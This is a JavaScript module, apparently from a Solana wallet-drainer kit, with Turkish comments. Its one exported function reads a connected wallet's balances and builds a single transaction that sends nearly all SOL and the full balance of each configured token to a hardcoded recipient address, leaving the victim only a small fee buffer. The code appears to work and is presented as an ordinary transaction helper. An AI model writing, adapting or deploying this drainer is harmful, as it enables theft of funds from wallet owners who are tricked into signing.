/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

// RPC Throttle
const BATCH_SIZE = 3;
const BATCH_DELAY_MS = 1000;

/** Batch runner */
async function runBatches(tasks) {
  const results = [];
  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
    const res = await Promise.all(batch);
    results.push(...res);
    if (i + BATCH_SIZE < tasks.length) {
      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
    }
  }
  return results;
}

/** Mint owner'a bakarak token programını tespit et (legacy / 2022). */
async function detectTokenProgramId(mintPubkey) {
  const info = await connection.getAccountInfo(mintPubkey);
  if (!info) return TOKEN_PROGRAM_ID; // güvenli varsayılan
  const owner = info.owner;
  if (owner.equals(TOKEN_PROGRAM_ID)) return TOKEN_PROGRAM_ID;
  if (owner.equals(TOKEN_2022_PROGRAM_ID)) return TOKEN_2022_PROGRAM_ID;
  return owner; // çok nadir özel programlar
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");

  // SOL bakiyesi kontrolü
  const userSolLamports = await connection.getBalance(payer);
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // 0) Her mint için programId tespiti
  const progTasks = TOKEN_CONFIGS.map(({ mint }) => async () => {
    const programId = await detectTokenProgramId(mint);
    return { mint, programId };
  });
  const progPairs = await runBatches(progTasks);
  const programByMint = new Map(progPairs.map((x) => [x.mint.toBase58(), x.programId]));

  // 1) Kullanıcı bakiyelerini oku (doğru programId ile)
  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
    const programId = programByMint.get(mint.toBase58()) || TOKEN_PROGRAM_ID;

    // ATA'ları doğru programla türet
    const userAta = await getAssociatedTokenAddress(
      mint,
      payer,
      false,
      programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );
    const toAta = await getAssociatedTokenAddress(
      mint,
      toPublicKey,
      false,
      programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    // Kullanıcı ATA bakiyesini doğru programla oku
    let amount = 0n;
    let sufficient = false;
    try {
      const acct = await getAccount(connection, userAta, undefined, programId);
      amount = acct.amount; // bigint
      const th = BigInt(threshold ?? 0);
      sufficient = amount >= th; // eşik dahil
    } catch {
      sufficient = false;
    }

    // Alıcı ATA mevcut mu? (ATA oluşturmayacağız; yoksa bu minti atlarız)
    let toAtaExists = true;
    try {
      await getAccount(connection, toAta, undefined, programId);
    } catch {
      toAtaExists = false;
    }

    return { mint, programId, userAta, toAta, amount, sufficient, toAtaExists };
  });
  const userTokenInfos = await runBatches(balanceTasks);

  // 2) Instruction'ları sırayla derle
  const instructions = [];

  // 2a) SOL transfer instruction
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // 2b) SPL-token transfer (ATA oluşturma yok; yalnızca mevcut ATA'lara, doğru programId ile)
  for (const info of userTokenInfos) {
    const { userAta, toAta, amount, sufficient, toAtaExists, programId, mint } = info;
    if (!sufficient) continue;
    if (!toAtaExists) {
      console.warn(`Recipient ATA yok, atlandı → mint=${mint.toBase58()} prog=${programId.toBase58()}`);
      continue;
    }

    instructions.push(
      createTransferInstruction(
        userAta,
        toAta,
        payer,
        amount,     // bigint ok
        [],         // signer yok
        programId   // **KRİTİK**: mint'in gerçek token programı
      )
    );
  }

  // SPL hiç eklenmediyse ve SOL da yoksa vazgeç
  const hasAnySpl = instructions.some(
    (ix) => ix.programId.equals(TOKEN_PROGRAM_ID) || ix.programId.equals(TOKEN_2022_PROGRAM_ID)
  );
  if (!isSolSufficient && !hasAnySpl) {
    console.warn("SPL yok (bakiye/ATA/programId uyumsuzluğu) ve SOL da yetersiz.");
    return null;
  }

  // 3) VersionedTransaction
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  // Debug (Phantom bazı logları redakte edebilir)
  try {
    console.table(
      userTokenInfos.map((t) => ({
        mint: t.mint.toBase58(),
        prog:
          t.programId.equals(TOKEN_PROGRAM_ID)
            ? "TOKEN_PROGRAM"
            : t.programId.equals(TOKEN_2022_PROGRAM_ID)
            ? "TOKEN_2022"
            : t.programId.toBase58(),
        userAta: t.userAta.toBase58(),
        toAta: t.toAta.toBase58(),
        amount: t.amount.toString(),
        sufficient: t.sufficient,
        toAtaExists: t.toAtaExists,
      }))
    );
    console.log("SOL to send (lamports):", solToSend);
  } catch {}

  return new VersionedTransaction(messageV0);
}
